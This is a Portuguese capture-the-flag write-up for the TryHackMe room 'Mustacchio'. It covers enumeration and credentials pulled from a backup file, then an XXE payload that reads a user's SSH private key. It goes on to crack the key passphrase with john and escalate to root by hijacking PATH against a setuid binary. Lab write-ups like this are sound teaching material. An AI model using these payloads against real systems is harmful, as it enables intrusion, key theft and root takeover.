# Mustacchio
https://tryhackme.com/room/mustacchio

## Identificação do alvo e exploração
Fazendo uma varredura de todas as portas no alvo com NMAP

      PORT   STATE SERVICE VERSION
      22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
      8765/tcp open  ultraseek-http

Com gobuster achei esse diretorio

    /custom/js

Dentro dele tem um arquivo users.bak

```sh
strings users.bak
```

E descobri isso admin:bulldog19

Entrando em http://IP:8765 abre uma area de login que usando as cred de cima é possivel autenticar

Nessa página tem um input que aceita XML, o formato do XML ta disponível em um arquivo também nessa página em /auth/dontforget.bak

Com input que aceita XML é possivel explorar XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

Apos pegar o id_rsa, precisa formatar e atribuir a permissao 600

```sh
chmod 600 id_rsa
```

Antes de tentar conectar com ssh precisa descobrir a passphrase

```sh
cp $(locate ssh2john.py) .
python ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
```

agora da para rodar

```sh
ssh barry@<IP> -i id_rsa
```
passphrase: urieljames

## Privesc
Na pasta /home/joe existe um arquivo "live_log" com permissão setuid, ou seja, ele pode ser executado com os privilegios do dono do arquivo (no caso o root)

Rodando o comando "strings live_log", é possivel ver que ele usa o comando "tail", com isso é possível escalar privilégio explorando o PATH:

```sh
echo "/bin/bash" > /tmp/tail
chmod 777 /tmp/tail
export PATH=/tmp:$PATH
./live_log
```
